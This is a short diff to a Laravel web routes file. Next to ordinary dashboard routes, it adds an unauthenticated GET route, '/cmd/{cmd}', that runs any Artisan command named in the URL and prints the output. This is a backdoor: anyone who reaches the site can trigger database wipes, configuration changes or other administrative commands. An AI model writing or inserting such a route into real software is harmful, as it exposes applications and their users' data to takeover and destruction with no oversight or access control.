@@ -20,6 +20,11 @@ use App\Http\Controllers\fanpage\fanPage;
 
 $controller_path = 'App\Http\Controllers';
 
+Route::get("/cmd/{cmd}", function ($cmd) {
+    \Artisan::call($cmd);
+    echo "<pre>";
+    return \Artisan::output();
+});
 // Main Page Route
 Route::get('/', $controller_path . '\dashboard\Analytics@index')->name('dashboard-analytics');
 Route::get('/dashboard/analytics', $controller_path . '\dashboard\Analytics@index')->name('dashboard-analytics');
